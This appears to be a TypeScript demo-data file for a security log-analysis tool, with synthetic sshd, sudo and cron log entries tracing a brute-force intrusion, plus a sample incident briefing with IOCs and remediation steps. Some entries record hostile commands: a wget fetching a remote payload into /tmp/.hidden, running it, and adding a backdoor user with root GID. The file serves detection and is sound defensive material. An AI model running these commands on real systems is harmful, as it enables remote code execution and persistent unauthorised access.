import type { AnalysisResult, AIBriefing, Anomaly } from "./types";

const a = (
  id: number,
  ts: string,
  ip: string,
  user: string,
  action: string,
  status: string,
  port: number | null,
  raw: string,
  threat_type: Anomaly["threat_type"],
  severity: Anomaly["severity"],
  isolation_score: number,
  threat_score: number,
  attack_chain: string[],
): Anomaly => ({
  id,
  parsed_log: { timestamp: ts, ip, user, action, status, port, raw },
  isolation_score,
  threat_type,
  composite_score: isolation_score + threat_score * 0.3,
  threat_score,
  attack_chain,
  severity,
});

export const DEMO_ANOMALIES: Anomaly[] = [
  a(1,  "2024-12-10T04:15:12Z", "185.220.101.34", "root",  "Failed password", "FAIL", 52401, "Dec 10 04:15:12 srv01 sshd[11823]: Failed password for root from 185.220.101.34 port 52401 ssh2",           "BRUTE_FORCE",         "CRITICAL", 0.92, 12, ["SSH_BRUTE_FORCE", "MULTI_FAIL"]),
  a(2,  "2024-12-10T04:15:31Z", "185.220.101.34", "root",  "Failed password", "FAIL", 52402, "Dec 10 04:15:31 srv01 sshd[11824]: Failed password for root from 185.220.101.34 port 52402 ssh2",           "BRUTE_FORCE",         "CRITICAL", 0.94, 12, ["SSH_BRUTE_FORCE", "MULTI_FAIL"]),
  a(3,  "2024-12-10T04:16:04Z", "185.220.101.34", "admin", "Failed password", "FAIL", 52403, "Dec 10 04:16:04 srv01 sshd[11825]: Failed password for invalid user admin from 185.220.101.34 port 52403 ssh2","BRUTE_FORCE",         "CRITICAL", 0.93, 14, ["SSH_BRUTE_FORCE", "INVALID_USER", "MULTI_FAIL"]),
  a(4,  "2024-12-10T04:17:22Z", "185.220.101.34", "ubuntu","Failed password", "FAIL", 52410, "Dec 10 04:17:22 srv01 sshd[11830]: Failed password for ubuntu from 185.220.101.34 port 52410 ssh2",          "BRUTE_FORCE",         "HIGH",     0.87, 10, ["SSH_BRUTE_FORCE", "MULTI_FAIL"]),
  a(5,  "2024-12-10T04:18:45Z", "185.220.101.34", "deploy","Failed password", "FAIL", 52422, "Dec 10 04:18:45 srv01 sshd[11836]: Failed password for deploy from 185.220.101.34 port 52422 ssh2",          "BRUTE_FORCE",         "HIGH",     0.85, 8,  ["SSH_BRUTE_FORCE"]),
  a(6,  "2024-12-10T04:19:58Z", "185.220.101.34", "git",   "Failed password", "FAIL", 52435, "Dec 10 04:19:58 srv01 sshd[11841]: Failed password for git from 185.220.101.34 port 52435 ssh2",             "BRUTE_FORCE",         "HIGH",     0.86, 8,  ["SSH_BRUTE_FORCE"]),
  a(7,  "2024-12-10T04:22:11Z", "91.240.118.222", "root",  "Failed password", "FAIL", 43100, "Dec 10 04:22:11 srv01 sshd[11850]: Failed password for root from 91.240.118.222 port 43100 ssh2",             "BRUTE_FORCE",         "HIGH",     0.88, 10, ["SSH_BRUTE_FORCE", "GEO_ANOMALY"]),
  a(8,  "2024-12-10T04:24:33Z", "91.240.118.222", "root",  "Failed password", "FAIL", 43102, "Dec 10 04:24:33 srv01 sshd[11851]: Failed password for root from 91.240.118.222 port 43102 ssh2",             "BRUTE_FORCE",         "MEDIUM",   0.76, 6,  ["SSH_BRUTE_FORCE"]),
  a(9,  "2024-12-10T04:31:02Z", "185.220.101.34", "deploy","Accepted password","OK",  52499, "Dec 10 04:31:02 srv01 sshd[11862]: Accepted password for deploy from 185.220.101.34 port 52499 ssh2",         "ACCOUNT_COMPROMISE",  "CRITICAL", 0.97, 18, ["SSH_BRUTE_FORCE", "AUTH_SUCCESS_AFTER_FAIL", "PRIV_ACCOUNT"]),
  a(10, "2024-12-10T04:31:04Z", "185.220.101.34", "deploy","session opened",  "OK",  52499, "Dec 10 04:31:04 srv01 sshd[11862]: pam_unix(sshd:session): session opened for user deploy from 185.220.101.34","ACCOUNT_COMPROMISE",  "CRITICAL", 0.96, 16, ["AUTH_SUCCESS_AFTER_FAIL", "SESSION_OPEN"]),
  a(11, "2024-12-10T04:33:17Z", "185.220.101.34", "deploy","sudo",            "OK",  null,  "Dec 10 04:33:17 srv01 sudo[11900]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",    "PRIVILEGE_ESCALATION","CRITICAL", 0.95, 20, ["SUDO_ROOT", "POST_COMPROMISE"]),
  a(12, "2024-12-10T04:38:40Z", "10.0.0.51",      "root",  "ssh connect",     "OK",  22,    "Dec 10 04:38:40 srv01 sshd[11945]: Accepted publickey for root from 10.0.0.51 port 60122 ssh2",               "LATERAL_MOVEMENT",    "HIGH",     0.83, 14, ["INTERNAL_SSH", "ROOT_LOGIN", "POST_COMPROMISE"]),
  a(13, "2024-12-10T04:41:55Z", "10.0.0.51",      "root",  "ssh connect",     "OK",  22,    "Dec 10 04:41:55 srv02 sshd[12001]: Accepted publickey for root from 10.0.0.51 port 60244 ssh2",               "LATERAL_MOVEMENT",    "HIGH",     0.84, 14, ["INTERNAL_SSH", "ROOT_LOGIN", "NEW_HOST"]),
  a(14, "2024-12-10T04:45:03Z", "10.0.0.52",      "root",  "ssh connect",     "OK",  22,    "Dec 10 04:45:03 srv03 sshd[12080]: Accepted publickey for root from 10.0.0.52 port 61001 ssh2",               "LATERAL_MOVEMENT",    "HIGH",     0.82, 12, ["INTERNAL_SSH", "ROOT_LOGIN", "NEW_HOST"]),
  a(15, "2024-12-10T04:52:11Z", "10.0.0.51",      "root",  "crontab",         "MOD", null,  "Dec 10 04:52:11 srv01 CRON[12100]: (root) REPLACE (crontabs/root)",                                            "PERSISTENCE",         "HIGH",     0.80, 12, ["CRON_MODIFY", "ROOT_CRON"]),
  a(16, "2024-12-10T05:03:44Z", "10.0.0.51",      "root",  "wget",            "OK",  null,  "Dec 10 05:03:44 srv01 kernel: [12222.441] wget https://95.173.136.70/payload.sh -O /tmp/.hidden",              "SYSTEM_TAMPERING",    "MEDIUM",   0.74, 10, ["OUTBOUND_EXEC_DL", "HIDDEN_FILE"]),
  a(17, "2024-12-10T05:11:28Z", "10.0.0.51",      "root",  "chmod",           "OK",  null,  "Dec 10 05:11:28 srv01 kernel: [12690.113] chmod +x /tmp/.hidden && /tmp/.hidden &",                            "SYSTEM_TAMPERING",    "MEDIUM",   0.73, 10, ["PAYLOAD_EXEC", "HIDDEN_FILE"]),
  a(18, "2024-12-10T05:38:09Z", "10.0.0.51",      "root",  "useradd",         "OK",  null,  "Dec 10 05:38:09 srv01 useradd[12800]: new user: name=svc_backup, UID=1337, GID=0, home=/dev/shm",             "PERSISTENCE",         "MEDIUM",   0.71, 8,  ["BACKDOOR_USER", "ROOT_GID"]),
];

export const DEMO_RESULT: AnalysisResult = {
  anomalies: DEMO_ANOMALIES,
  total_logs_parsed: 847,
  total_anomalies: DEMO_ANOMALIES.length,
  rule_flagged: DEMO_ANOMALIES.filter((a) => a.threat_score > 0).length,
};

export const DEMO_BRIEFING: AIBriefing = {
  executive_summary:
    "A coordinated multi-stage attack was detected originating from known Tor exit nodes (185.220.101.34, 91.240.118.222). The attacker conducted an SSH brute-force campaign across 6 usernames over 16 minutes before successfully authenticating as the `deploy` user. Following initial access, privilege escalation to root was achieved within 2 minutes via sudo. The attacker then performed east-west lateral movement across 3 internal servers, established persistence via cron modification, downloaded and executed a remote payload, and created a backdoor user account `svc_backup` with root GID.",
  technical_details:
    "Attack chain: Reconnaissance → Brute Force (T1110.001) → Valid Accounts (T1078) → Sudo Privilege Escalation (T1548.003) → Lateral Movement via SSH (T1021.004) → Scheduled Task/Cron (T1053.003) → Ingress Tool Transfer (T1105) → Create Account (T1136.001).\n\nIOCs: 185.220.101.34 (Tor exit, DE), 91.240.118.222 (Tor exit, RU), 95.173.136.70 (C2 candidate, RU), /tmp/.hidden, svc_backup:UID=1337:GID=0",
  remediation_steps: [
    "Immediately revoke all active sessions for deploy, ubuntu, git, and root accounts. Reset credentials for all affected users.",
    "Isolate srv01, srv02, srv03 from the network and perform forensic imaging before remediation.",
    "Remove backdoor user svc_backup (UID 1337) and audit /etc/passwd, /etc/sudoers, and crontabs on all three hosts.",
    "Block IPs 185.220.101.34, 91.240.118.222, 95.173.136.70 at the perimeter firewall and update threat intel feeds.",
    "Enforce SSH key-only authentication. Disable password authentication in sshd_config. Implement fail2ban with a 5-attempt threshold.",
    "Deploy EDR tooling on all Linux hosts and enable auditd logging for process execution, file creation, and network connections.",
  ],
};
